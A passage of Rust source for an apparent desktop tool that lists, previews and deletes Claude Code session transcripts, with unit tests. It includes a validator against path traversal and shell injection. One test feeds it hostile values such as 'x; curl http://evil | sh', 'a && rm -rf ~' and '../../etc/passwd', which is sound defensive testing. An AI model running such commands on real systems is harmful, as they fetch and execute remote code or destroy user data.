use std::fs;
use std::io::{BufRead, BufReader, Read, Seek, SeekFrom};
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use chrono::{DateTime, Utc};
use directories::BaseDirs;
use serde::Serialize;

/// Maximum number of JSONL lines scanned per session file to locate metadata and
/// the first user prompt. Sessions put sessionId/gitBranch on line 1 and the
/// first user message usually within the first few lines; 80 is a conservative
/// upper bound that tolerates heavy caveat preambles without reading the whole
/// transcript.
const MAX_LINES_SCANNED: usize = 80;

/// Maximum sessions returned from [`list_claude_sessions`]. The picker in the UI
/// surfaces the most recent sessions; a user with more than this is almost
/// certainly better served by searching rather than scrolling.
const MAX_SESSIONS_RETURNED: usize = 50;

/// Maximum characters kept from a first-prompt preview. Enough to distinguish
/// sessions in the picker without overflowing the card.
const MAX_PROMPT_CHARS: usize = 200;

/// Bytes read back from the end of a transcript to find the newest
/// `{"type":"last-prompt"}` (and, if one ever appears there, `{"type":"summary"}`)
/// entry. Claude Code appends a `last-prompt` line as turns complete, so the
/// newest one sits near EOF: across all 353 transcripts carrying one on the
/// machine this was written against, the farthest was ~34 KB from the end, so
/// 64 KB covers observed data with slack while staying a bounded read.
const TAIL_SCAN_BYTES: u64 = 64 * 1024;

#[derive(Debug, Clone, Serialize)]
pub struct ClaudeSessionInfo {
    pub session_id: String,
    /// Conversation title from a `{"type":"summary","summary":...}` entry.
    ///
    /// No transcript on the machine this was written against (Claude Code
    /// 2.1.229) contains such an entry, so this is usually `None`; the shape is
    /// still parsed because it costs nothing in the existing scan and older /
    /// newer Claude Code versions are documented to write it.
    pub summary: Option<String>,
    pub first_prompt: Option<String>,
    /// Most recent user prompt, from the newest `{"type":"last-prompt"}` entry
    /// near the end of the transcript — shows where a long conversation left
    /// off, which the first prompt alone cannot.
    pub last_prompt: Option<String>,
    pub started_at: String,
    pub last_active: String,
    pub git_branch: Option<String>,
    /// Directory the conversation ran in, as recorded in the transcript.
    ///
    /// `claude --resume <id>` only finds a session when the shell's cwd maps to
    /// the same `~/.claude/projects/<encoded-cwd>/` directory the transcript
    /// lives in, so a resume launch must run here and nowhere else. Kept even
    /// when the directory no longer exists so the UI can still say where the
    /// conversation ran — check [`Self::resumable`] before spawning here.
    pub cwd: Option<String>,
    /// Whether `claude --resume` can work: the recorded cwd still exists.
    pub resumable: bool,
    /// Human-readable reason when `resumable` is `false`.
    pub resume_blocked_reason: Option<String>,
}

/// System XML tags that indicate a non-user message (should be skipped entirely).
const SYSTEM_TAGS: &[&str] = &[
    "<local-command-caveat>",
    "<bash-input>",
    "<bash-stdout>",
    "<bash-stderr>",
    "<local-command-stdout>",
    "<local-command-stderr>",
];

/// Checks if a user message is a system-generated message (not a real user prompt).
fn is_system_message(content: &str) -> bool {
    let trimmed = content.trim();
    SYSTEM_TAGS.iter().any(|tag| trimmed.starts_with(tag))
}

/// Extracts readable prompt text from a user message.
/// - Slash commands: extracts `<command-args>` content, or the command name
/// - System messages: returns empty (caller should skip and try next message)
/// - Plain text: returns as-is
fn extract_prompt_text(content: &str) -> String {
    // Try to extract <command-args>...</command-args>
    if let Some(start) = content.find("<command-args>") {
        let after = &content[start + 14..]; // len("<command-args>") == 14
        if let Some(end) = after.find("</command-args>") {
            let args = after[..end].trim();
            if !args.is_empty() {
                return args.to_string();
            }
        }
    }

    // Extract slash command name (e.g., "/review-pr") from <command-name>
    if let Some(start) = content.find("<command-name>") {
        let after = &content[start + 14..]; // len("<command-name>") == 14
        if let Some(end) = after.find("</command-name>") {
            let cmd = after[..end].trim();
            if !cmd.is_empty() {
                return cmd.to_string();
            }
        }
    }

    // If content doesn't contain XML tags, return as-is
    if !content.contains('<') || !content.contains('>') {
        return content.trim().to_string();
    }

    // Strip XML tags and return the text content
    let stripped: String = {
        let mut result = String::with_capacity(content.len());
        let mut in_tag = false;
        for ch in content.chars() {
            if ch == '<' {
                in_tag = true;
            } else if ch == '>' {
                in_tag = false;
            } else if !in_tag {
                result.push(ch);
            }
        }
        result
    };
    let trimmed = stripped.trim().to_string();
    if !trimmed.is_empty() {
        return trimmed;
    }

    content.trim().to_string()
}

/// Encodes a filesystem path into Claude Code's projects-directory naming scheme.
///
/// Empirically, Claude Code replaces every character that isn't ASCII alphanumeric
/// or `-` with a `-`. That means `/`, `.`, space, and `_` all map to `-`, and a
/// dotfile like `/Users/alice/.config` becomes `-Users-alice--config` (the slash
/// *and* the dot each become a dash, producing `--`).
///
/// An earlier version only replaced `/`, which silently returned an empty list
/// for any path containing a dot — e.g. hidden directories or extensions.
///
/// A later version kept `_` as-is, which silently returned an empty list for
/// any path containing an underscore — e.g. `C:\git\Dreadnought_Father_Folder`,
/// whose real transcript directory is `C--git-Dreadnought-Father-Folder` (issue #86).
pub(crate) fn encode_project_path(project_path: &str) -> String {
    project_path
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' {
                c
            } else {
                '-'
            }
        })
        .collect()
}

/// Canonicalizes `project_path` into the form Claude Code encodes, falling back
/// to the input when the path no longer exists.
///
/// On Windows `fs::canonicalize` returns an extended-length path
/// (`\\?\C:\git\maestro`). Feeding that straight into [`encode_project_path`]
/// yielded `----C--git-maestro` — four leading dashes for `\\?\` — which is a
/// directory that never exists, so every session lookup silently returned an
/// empty list on Windows. Strip the prefix before encoding.
fn canonical_project_path(project_path: &str) -> String {
    let canonical = fs::canonicalize(project_path)
        .unwrap_or_else(|_| PathBuf::from(project_path))
        .to_string_lossy()
        .into_owned();

    #[cfg(windows)]
    let canonical = match canonical.strip_prefix(r"\\?\") {
        Some(stripped) => stripped.to_string(),
        None => canonical,
    };

    canonical
}

/// Converts a project path to Claude's session directory
/// `~/.claude/projects/<encoded-path>/`.
fn project_path_to_claude_dir(project_path: &str) -> Option<PathBuf> {
    let base_dirs = BaseDirs::new()?;
    let home = base_dirs.home_dir();
    Some(
        home.join(".claude")
            .join("projects")
            .join(encode_project_path(project_path)),
    )
}

/// Most recently modified `*.jsonl` in `dir` — the newest transcript.
/// Entries whose metadata cannot be read are skipped, not fatal.
pub(crate) fn newest_jsonl_in(dir: &Path) -> Option<PathBuf> {
    fs::read_dir(dir)
        .ok()?
        .flatten()
        .filter(|e| e.path().extension().is_some_and(|ext| ext == "jsonl"))
        .filter_map(|e| Some((e.metadata().ok()?.modified().ok()?, e.path())))
        .max_by_key(|(mtime, _)| *mtime)
        .map(|(_, path)| path)
}

/// The newest transcript in the Claude session directory of `project_path`
/// (raw path — canonicalized here, same as every listing). Samurai recovery's
/// fallback (issue #56) when the transcript watcher no longer knows a dead
/// session's file. `None` when the directory is missing or holds no `*.jsonl`.
pub(crate) fn newest_transcript_for_project(project_path: &str) -> Option<PathBuf> {
    let dir = project_path_to_claude_dir(&canonical_project_path(project_path))?;
    newest_jsonl_in(&dir)
}

/// Truncates `s` to at most `max_chars` characters. If the input is longer it
/// is cut on a character boundary and `"..."` is appended.
///
/// This exists because `&s[..n]` slices by *bytes*, and a byte index that falls
/// mid-codepoint panics at runtime. The previous implementation would crash
/// whenever a prompt preview's byte 200 fell inside a multibyte character.
fn truncate_chars(s: &str, max_chars: usize) -> String {
    if s.chars().count() <= max_chars {
        return s.to_string();
    }
    let truncated: String = s.chars().take(max_chars).collect();
    format!("{truncated}...")
}

/// Validates that a session_id looks like a UUID-style identifier and can't be
/// used for path traversal when joined into `~/.claude/projects/<dir>/`.
///
/// Real session ids are UUIDv4s (`01234567-89ab-...`); anything containing a
/// path separator or `..` is rejected.
fn is_safe_session_id(session_id: &str) -> bool {
    if session_id.is_empty() {
        return false;
    }
    if session_id.contains('/') || session_id.contains('\\') || session_id.contains("..") {
        return false;
    }
    // Every character must be hex digit or dash. Cheap upper bound on UUID shape.
    session_id
        .chars()
        .all(|c| c.is_ascii_hexdigit() || c == '-')
}

/// Scans the tail of a transcript for the newest `{"type":"last-prompt"}` and
/// `{"type":"summary"}` entries, returning `(summary, last_prompt)`.
///
/// Reads at most [`TAIL_SCAN_BYTES`] from the end (never the whole file) and
/// walks the lines in reverse so the newest entry of each kind wins. When
/// `expected_session_id` is known, `last-prompt` entries stamped with a
/// *different* sessionId are ignored — resumed conversations copy entries
/// across files, and a foreign session's prompt must not label this one.
fn scan_tail_for_recent_entries(
    path: &Path,
    expected_session_id: Option<&str>,
) -> (Option<String>, Option<String>) {
    let Ok(mut file) = fs::File::open(path) else {
        return (None, None);
    };
    let len = file.metadata().map(|m| m.len()).unwrap_or(0);
    let start = len.saturating_sub(TAIL_SCAN_BYTES);
    if file.seek(SeekFrom::Start(start)).is_err() {
        return (None, None);
    }
    let mut buf = Vec::with_capacity((len - start) as usize);
    if file.read_to_end(&mut buf).is_err() {
        return (None, None);
    }
    let text = String::from_utf8_lossy(&buf);
    let mut lines: Vec<&str> = text.lines().collect();
    // When the read started mid-file the first line is almost certainly a
    // fragment of a larger JSON line; parsing it would fail anyway, drop it.
    if start > 0 && !lines.is_empty() {
        lines.remove(0);
    }

    let mut summary: Option<String> = None;
    let mut last_prompt: Option<String> = None;
    for line in lines.iter().rev() {
        // Cheap substring pre-filter so huge tool-result lines are not JSON-parsed.
        let looks_last = last_prompt.is_none() && line.contains(r#""type":"last-prompt""#);
        let looks_summary = summary.is_none() && line.contains(r#""type":"summary""#);
        if !looks_last && !looks_summary {
            continue;
        }
        let Ok(val) = serde_json::from_str::<serde_json::Value>(line) else {
            continue;
        };
        match val.get("type").and_then(|v| v.as_str()) {
            Some("last-prompt") if last_prompt.is_none() => {
                let foreign = matches!(
                    (expected_session_id, val.get("sessionId").and_then(|v| v.as_str())),
                    (Some(expected), Some(stamped)) if expected != stamped
                );
                if !foreign {
                    if let Some(p) = val.get("lastPrompt").and_then(|v| v.as_str()) {
                        let p = p.trim();
                        if !p.is_empty() {
                            last_prompt = Some(truncate_chars(p, MAX_PROMPT_CHARS));
                        }
                    }
                }
            }
            Some("summary") if summary.is_none() => {
                if let Some(s) = val.get("summary").and_then(|v| v.as_str()) {
                    let s = s.trim();
                    if !s.is_empty() {
                        summary = Some(truncate_chars(s, MAX_PROMPT_CHARS));
                    }
                }
            }
            _ => {}
        }
        if summary.is_some() && last_prompt.is_some() {
            break;
        }
    }
    (summary, last_prompt)
}

/// Parses session info from a JSONL transcript file.
fn parse_session_file(path: &Path) -> Option<ClaudeSessionInfo> {
    let file = fs::File::open(path).ok()?;
    let reader = BufReader::new(file);

    let mut session_id: Option<String> = None;
    let mut git_branch: Option<String> = None;
    let mut started_at: Option<String> = None;
    let mut first_prompt: Option<String> = None;
    let mut cwd: Option<String> = None;
    let mut summary: Option<String> = None;

    for (i, line) in reader.lines().enumerate() {
        if i >= MAX_LINES_SCANNED {
            break;
        }
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };
        if line.is_empty() {
            continue;
        }

        let val: serde_json::Value = match serde_json::from_str(&line) {
            Ok(v) => v,
            Err(_) => continue,
        };

        // Extract sessionId and gitBranch from the first entry
        if session_id.is_none() {
            if let Some(sid) = val.get("sessionId").and_then(|v| v.as_str()) {
                session_id = Some(sid.to_string());
            }
        }
        if git_branch.is_none() {
            if let Some(branch) = val.get("gitBranch").and_then(|v| v.as_str()) {
                git_branch = Some(branch.to_string());
            }
        }
        if started_at.is_none() {
            if let Some(ts) = val.get("timestamp").and_then(|v| v.as_str()) {
                started_at = Some(ts.to_string());
            }
        }
        if cwd.is_none() {
            if let Some(dir) = val.get("cwd").and_then(|v| v.as_str()) {
                cwd = Some(dir.to_string());
            }
        }
        // A `{"type":"summary","summary":...}` title line, when Claude wrote
        // one, sits at the top of the file — before any user message, so this
        // runs before the early break below can fire.
        if summary.is_none() && val.get("type").and_then(|v| v.as_str()) == Some("summary") {
            if let Some(s) = val.get("summary").and_then(|v| v.as_str()) {
                let s = s.trim();
                if !s.is_empty() {
                    summary = Some(truncate_chars(s, MAX_PROMPT_CHARS));
                }
            }
        }

        // Look for the first real user message (skip system-generated messages)
        if first_prompt.is_none() {
            if let Some("user") = val.get("type").and_then(|v| v.as_str()) {
                let raw = val
                    .get("message")
                    .and_then(|m| m.get("content"))
                    .and_then(|c| {
                        // content can be a string or an array of content blocks
                        if let Some(s) = c.as_str() {
                            Some(s.to_string())
                        } else if let Some(arr) = c.as_array() {
                            arr.iter().find_map(|block| {
                                if block.get("type").and_then(|t| t.as_str()) == Some("text") {
                                    block
                                        .get("text")
                                        .and_then(|t| t.as_str())
                                        .map(|s| s.to_string())
                                } else {
                                    None
                                }
                            })
                        } else {
                            None
                        }
                    });

                if let Some(content) = raw {
                    // Skip system-generated messages (caveats, bash I/O, etc.)
                    if is_system_message(&content) {
                        continue;
                    }
                    let clean = extract_prompt_text(&content);
                    if !clean.is_empty() {
                        first_prompt = Some(truncate_chars(&clean, MAX_PROMPT_CHARS));
                    }
                }
            }
        }

        // Stop early if we have everything
        if session_id.is_some() && first_prompt.is_some() && cwd.is_some() {
            break;
        }
    }

    let session_id = session_id?;

    // The id is later interpolated into `claude --resume <id>` and written to a
    // shell PTY, so a transcript whose sessionId is not a UUID-shaped token
    // (e.g. an attacker-planted file containing shell metacharacters) must never
    // reach the resume picker.
    if !is_safe_session_id(&session_id) {
        log::warn!(
            "Skipping Claude session with unsafe sessionId in {}",
            path.display()
        );
        return None;
    }

    // Get file modification time for last_active
    let metadata = fs::metadata(path).ok()?;
    let mtime = metadata.modified().ok().unwrap_or(SystemTime::UNIX_EPOCH);
    let last_active: DateTime<Utc> = mtime.into();

    // The newest last-prompt (and any late summary) lives near EOF — a bounded
    // tail read, not a second pass over the whole file.
    let (tail_summary, last_prompt) = scan_tail_for_recent_entries(path, Some(session_id.as_str()));
    let summary = summary.or(tail_summary);

    // `claude --resume` only works from the transcript's own cwd. A recorded
    // cwd that no longer exists (deleted worktree) cannot host a resume — keep
    // it for display, but mark the session not resumable with the reason.
    let (resumable, resume_blocked_reason) = match cwd.as_deref() {
        Some(dir) if Path::new(dir).is_dir() => (true, None),
        Some(_) => (
            false,
            Some("its directory no longer exists".to_string()),
        ),
        None => (
            false,
            Some("no working directory was recorded".to_string()),
        ),
    };

    Some(ClaudeSessionInfo {
        session_id,
        summary,
        first_prompt,
        last_prompt,
        started_at: started_at.unwrap_or_default(),
        last_active: last_active.to_rfc3339(),
        git_branch,
        cwd,
        resumable,
        resume_blocked_reason,
    })
}

/// Deletes a Claude Code session's JSONL transcript and optional snapshot directory.
#[tauri::command]
pub async fn delete_claude_session(
    project_path: String,
    session_id: String,
) -> Result<(), String> {
    if !is_safe_session_id(&session_id) {
        return Err(format!("Invalid session id: {session_id}"));
    }

    let canonical = canonical_project_path(&project_path);

    let claude_dir = project_path_to_claude_dir(&canonical)
        .ok_or_else(|| "Could not determine home directory".to_string())?;

    // Delete the JSONL transcript
    let jsonl_path = claude_dir.join(format!("{session_id}.jsonl"));
    if jsonl_path.exists() {
        fs::remove_file(&jsonl_path)
            .map_err(|e| format!("Failed to delete session file: {e}"))?;
    }

    // Delete the optional snapshot directory (same name without extension)
    let snapshot_dir = claude_dir.join(&session_id);
    if snapshot_dir.is_dir() {
        fs::remove_dir_all(&snapshot_dir)
            .map_err(|e| format!("Failed to delete session snapshot directory: {e}"))?;
    }

    Ok(())
}

/// Lists previous Claude Code sessions for a given project path.
/// Reads session data from Claude's native storage at `~/.claude/projects/`.
#[tauri::command]
pub async fn list_claude_sessions(project_path: String) -> Result<Vec<ClaudeSessionInfo>, String> {
    // Canonicalize the project path for consistent matching
    let canonical = canonical_project_path(&project_path);

    let claude_dir = project_path_to_claude_dir(&canonical)
        .ok_or_else(|| "Could not determine home directory".to_string())?;

    if !claude_dir.exists() {
        return Ok(Vec::new());
    }

    let entries =
        fs::read_dir(&claude_dir).map_err(|e| format!("Failed to read directory: {e}"))?;

    let mut sessions: Vec<ClaudeSessionInfo> = entries
        .filter_map(|entry| {
            let entry = entry.ok()?;
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) == Some("jsonl") {
                parse_session_file(&path)
            } else {
                None
            }
        })
        .collect();

    // Sort by last_active descending (most recent first)
    sessions.sort_by(|a, b| b.last_active.cmp(&a.last_active));

    sessions.truncate(MAX_SESSIONS_RETURNED);

    Ok(sessions)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- is_safe_session_id (resume-injection guard) ---------------------

    #[test]
    fn rejects_session_ids_with_shell_metacharacters() {
        // These would be interpolated into `claude --resume <id>` and written
        // to a shell PTY, so anything non-UUID-shaped must be rejected.
        assert!(!is_safe_session_id("x; curl http://evil | sh"));
        assert!(!is_safe_session_id("a && rm -rf ~"));
        assert!(!is_safe_session_id("../../etc/passwd"));
        assert!(!is_safe_session_id("a b"));
        assert!(!is_safe_session_id(""));
    }

    #[test]
    fn accepts_uuid_shaped_session_ids() {
        assert!(is_safe_session_id("01234567-89ab-cdef-0123-456789abcdef"));
        assert!(is_safe_session_id("deadbeef"));
    }

    // ---- newest_jsonl_in (samurai recovery fallback, issue #56) ----------

    #[test]
    fn newest_jsonl_picks_latest_transcript_and_ignores_other_files() {
        let tmp = tempfile::tempdir().unwrap();
        let old = tmp.path().join("old.jsonl");
        let new = tmp.path().join("new.jsonl");
        fs::write(&old, "{}\n").unwrap();
        fs::write(&new, "{}\n").unwrap();
        fs::write(tmp.path().join("notes.md"), "not a transcript").unwrap();
        // Backdate the old one so mtime ordering is deterministic.
        fs::File::options()
            .write(true)
            .open(&old)
            .unwrap()
            .set_modified(SystemTime::now() - std::time::Duration::from_secs(3600))
            .unwrap();
        assert_eq!(newest_jsonl_in(tmp.path()), Some(new));
    }

    #[test]
    fn newest_jsonl_missing_or_empty_dir_is_none() {
        let tmp = tempfile::tempdir().unwrap();
        assert_eq!(newest_jsonl_in(tmp.path()), None);
        assert_eq!(newest_jsonl_in(&tmp.path().join("nope")), None);
    }

    // ---- encode_project_path ---------------------------------------------

    #[test]
    fn encodes_slashes_to_dashes() {
        assert_eq!(
            encode_project_path("/Users/alice/project"),
            "-Users-alice-project"
        );
    }

    #[test]
    fn encodes_dotdirs_as_double_dashes() {
        // matches empirical Claude Code behavior where /. -> --
        assert_eq!(
            encode_project_path("/Users/alice/.claude-maestro"),
            "-Users-alice--claude-maestro"
        );
    }

    #[test]
    fn encodes_spaces_to_dashes() {
        assert_eq!(
            encode_project_path("/Users/alice/Maestro Projects/app"),
            "-Users-alice-Maestro-Projects-app"
        );
    }

    #[test]
    fn encodes_double_space_as_double_dash() {
        assert_eq!(
            encode_project_path("/Users/alice/Boilerplates - Starters"),
            "-Users-alice-Boilerplates---Starters"
        );
    }

    #[test]
    fn encode_preserves_dashes_but_maps_underscores_to_dashes() {
        assert_eq!(
            encode_project_path("/a-b_c/d_e-f"),
            "-a-b-c-d-e-f"
        );
    }

    #[test]
    fn encode_maps_underscore_in_real_world_path() {
        // Regression (issue #86): Claude Code's own encoder maps `_` to `-`
        // just like every other special char. Keeping `_` produced a directory
        // name (`C--git-Dreadnought_Father_Folder`) that never exists on disk,
        // so sessions/memories for any underscore path were invisible.
        assert_eq!(
            encode_project_path(r"C:\git\Dreadnought_Father_Folder"),
            "C--git-Dreadnought-Father-Folder"
        );
    }

    // ---- canonical_project_path ------------------------------------------

    #[test]
    fn canonical_path_encodes_to_the_directory_claude_actually_uses() {
        // Regression: on Windows fs::canonicalize returns `\\?\C:\...`, which
        // encoded to `----C--...` and made every lookup miss. The encoded form
        // must never start with the four dashes that prefix produces.
        let tmp = tempfile::tempdir().unwrap();
        let raw = tmp.path().to_string_lossy().into_owned();
        let encoded = encode_project_path(&canonical_project_path(&raw));
        assert!(
            !encoded.starts_with("----"),
            "verbatim prefix leaked into encoded dir: {encoded}"
        );
        assert!(
            project_path_to_claude_dir(&canonical_project_path(&raw)).is_some(),
            "expected a resolvable claude dir"
        );
    }

    #[test]
    fn canonical_path_falls_back_to_input_when_missing() {
        // A path that cannot be canonicalized is passed through unchanged so
        // lookups still target a deterministic directory.
        let missing = "/definitely/not/a/real/path-xyz";
        assert_eq!(canonical_project_path(missing), missing);
    }

    // ---- extract_prompt_text ---------------------------------------------

    #[test]
    fn extract_returns_plain_text_as_is() {
        assert_eq!(extract_prompt_text("hello world"), "hello world");
    }

    #[test]
    fn extract_prefers_command_args() {
        let content = "<command-name>/review-pr</command-name><command-args>222</command-args>";
        assert_eq!(extract_prompt_text(content), "222");
    }

    #[test]
    fn extract_falls_back_to_command_name_when_args_empty() {
        let content = "<command-name>/review-pr</command-name><command-args></command-args>";
        assert_eq!(extract_prompt_text(content), "/review-pr");
    }

    #[test]
    fn extract_strips_generic_xml_tags_preserving_inner_text() {
        // The stripper is intentionally naive: it removes `<...>` but keeps
        // whatever was between the tags.
        let content = "<ctx>irrelevant</ctx>real prompt";
        assert_eq!(extract_prompt_text(content), "irrelevantreal prompt");
    }

    // ---- is_system_message -----------------------------------------------

    #[test]
    fn detects_local_command_caveat_as_system() {
        assert!(is_system_message(
            "<local-command-caveat>skip me</local-command-caveat>"
        ));
    }

    #[test]
    fn detects_bash_stdout_as_system() {
        assert!(is_system_message("<bash-stdout>output</bash-stdout>"));
    }

    #[test]
    fn plain_text_is_not_system() {
        assert!(!is_system_message("hello"));
    }

    // ---- truncate_chars (the UTF-8 panic fix) ----------------------------

    #[test]
    fn truncate_shorter_than_max_is_unchanged() {
        assert_eq!(truncate_chars("short", 200), "short");
    }

    #[test]
    fn truncate_on_ascii_appends_ellipsis() {
        let s = "a".repeat(250);
        let out = truncate_chars(&s, 200);
        assert_eq!(out.chars().count(), 203); // 200 + "..."
        assert!(out.ends_with("..."));
    }

    #[test]
    fn truncate_handles_multibyte_without_panic() {
        // "🦀" is 4 bytes; byte 200 falls mid-character.
        // The previous `&s[..200]` would panic. This must not.
        let long = "🦀".repeat(300);
        let out = truncate_chars(&long, 200);
        assert!(out.ends_with("..."));
        // 200 crabs + 3 dots
        assert_eq!(out.chars().count(), 203);
    }

    // ---- is_safe_session_id ----------------------------------------------

    #[test]
    fn safe_uuid_is_accepted() {
        assert!(is_safe_session_id("01234567-89ab-cdef-0123-456789abcdef"));
    }

    #[test]
    fn traversal_and_separators_rejected() {
        assert!(!is_safe_session_id(""));
        assert!(!is_safe_session_id("../etc/passwd"));
        assert!(!is_safe_session_id("foo/bar"));
        assert!(!is_safe_session_id("foo\\bar"));
        assert!(!is_safe_session_id(".."));
    }

    #[test]
    fn non_hex_chars_rejected() {
        assert!(!is_safe_session_id("not-a-real-uuid-zzz"));
    }

    // ---- parse_session_file ----------------------------------------------

    #[test]
    fn parse_reads_basic_session() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","gitBranch":"main","timestamp":"2024-01-01T00:00:00Z","type":"user","message":{"content":"hello"}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.session_id, "abc");
        assert_eq!(info.first_prompt.as_deref(), Some("hello"));
        assert_eq!(info.git_branch.as_deref(), Some("main"));
    }

    #[test]
    fn parse_skips_system_messages_and_uses_next_user_line() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"<local-command-caveat>skip me</local-command-caveat>\"}}\n\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"real prompt\"}}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.first_prompt.as_deref(), Some("real prompt"));
    }

    #[test]
    fn parse_truncates_long_unicode_prompt_without_panic() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        // 300 crab emojis => far beyond 200 chars and deliberately multibyte.
        let long = "🦀".repeat(300);
        let jsonl = format!(
            r#"{{"sessionId":"abc","type":"user","message":{{"content":"{long}"}}}}"#
        );
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        let prompt = info.first_prompt.expect("prompt captured");
        assert!(prompt.ends_with("..."));
    }

    #[test]
    fn parse_returns_none_without_session_id() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        fs::write(&path, r#"{"type":"user","message":{"content":"hi"}}"#).unwrap();
        assert!(parse_session_file(&path).is_none());
    }

    #[test]
    fn parse_keeps_cwd_when_the_directory_still_exists() {
        // The resume launch runs in this directory, so it must survive parsing
        // and the session must be marked resumable.
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().to_string_lossy().replace('\\', "\\\\");
        let path = tmp.path().join("abc.jsonl");
        let jsonl = format!(
            r#"{{"sessionId":"abc","cwd":"{dir}","type":"user","message":{{"content":"hi"}}}}"#
        );
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        let expected = tmp.path().to_string_lossy().into_owned();
        assert_eq!(info.cwd, Some(expected));
        assert!(info.resumable);
        assert_eq!(info.resume_blocked_reason, None);
    }

    #[test]
    fn parse_marks_gone_directory_not_resumable_but_keeps_cwd() {
        // Deleted worktree: spawning a shell there would fail, so the session
        // must be visibly non-resumable — but the recorded cwd survives so the
        // UI can still say where the conversation ran.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","cwd":"/gone/worktree-xyz","type":"user","message":{"content":"hi"}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.cwd.as_deref(), Some("/gone/worktree-xyz"));
        assert!(!info.resumable);
        assert!(
            info.resume_blocked_reason
                .as_deref()
                .is_some_and(|r| r.contains("directory")),
            "reason must explain the missing directory: {:?}",
            info.resume_blocked_reason
        );
    }

    #[test]
    fn parse_without_recorded_cwd_is_not_resumable_with_reason() {
        // No cwd in the transcript means we cannot know where `claude --resume`
        // would find the session, so it must not be offered as resumable.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        fs::write(
            &path,
            r#"{"sessionId":"abc","type":"user","message":{"content":"hi"}}"#,
        )
        .unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.cwd, None);
        assert!(!info.resumable);
        assert!(
            info.resume_blocked_reason
                .as_deref()
                .is_some_and(|r| r.contains("recorded")),
            "reason must explain the missing record: {:?}",
            info.resume_blocked_reason
        );
    }

    // ---- summary / last-prompt (issue #104: legible history entries) ------

    #[test]
    fn parse_picks_up_summary_entry_as_title() {
        // `{"type":"summary"}` lines sit at the top of a transcript when Claude
        // generated a title. (None exist on this machine's real transcripts —
        // shape taken from Claude Code documentation of the entry.)
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"type\":\"summary\",\"summary\":\"Fixing the login flow\",\"leafUuid\":\"00000000-0000-0000-0000-000000000000\"}\n\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"hello\"}}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.summary.as_deref(), Some("Fixing the login flow"));
        assert_eq!(info.first_prompt.as_deref(), Some("hello"));
    }

    #[test]
    fn parse_without_summary_entry_leaves_only_first_prompt() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","type":"user","message":{"content":"hello"}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.summary, None);
        assert_eq!(info.first_prompt.as_deref(), Some("hello"));
    }

    #[test]
    fn parse_takes_newest_last_prompt_entry() {
        // Claude Code appends a `last-prompt` line as turns complete; the
        // newest one (nearest EOF) is where the conversation left off.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"first ask\"}}\n\
{\"type\":\"last-prompt\",\"lastPrompt\":\"first ask\",\"leafUuid\":\"a\",\"sessionId\":\"abc\"}\n\
{\"type\":\"last-prompt\",\"lastPrompt\":\"latest ask\",\"leafUuid\":\"b\",\"sessionId\":\"abc\"}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_prompt.as_deref(), Some("latest ask"));
        assert_eq!(info.first_prompt.as_deref(), Some("first ask"));
    }

    #[test]
    fn parse_ignores_last_prompt_stamped_with_another_session_id() {
        // Resumed conversations copy entries across files; a foreign session's
        // prompt must not label this one.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"mine\"}}\n\
{\"type\":\"last-prompt\",\"lastPrompt\":\"foreign\",\"leafUuid\":\"a\",\"sessionId\":\"def\"}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_prompt, None);
    }

    #[test]
    fn tail_scan_finds_last_prompt_past_the_head_scan_window() {
        // A transcript larger than the tail budget, with the last-prompt line
        // far beyond MAX_LINES_SCANNED and huge filler lines in between: the
        // bounded tail read must still find it (and drop the partial first
        // line of the tail window without choking).
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let filler_payload = "x".repeat(500);
        let mut jsonl =
            String::from("{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"start\"}}\n");
        for _ in 0..300 {
            jsonl.push_str(&format!(
                "{{\"type\":\"assistant\",\"sessionId\":\"abc\",\"payload\":\"{filler_payload}\"}}\n"
            ));
        }
        jsonl.push_str(
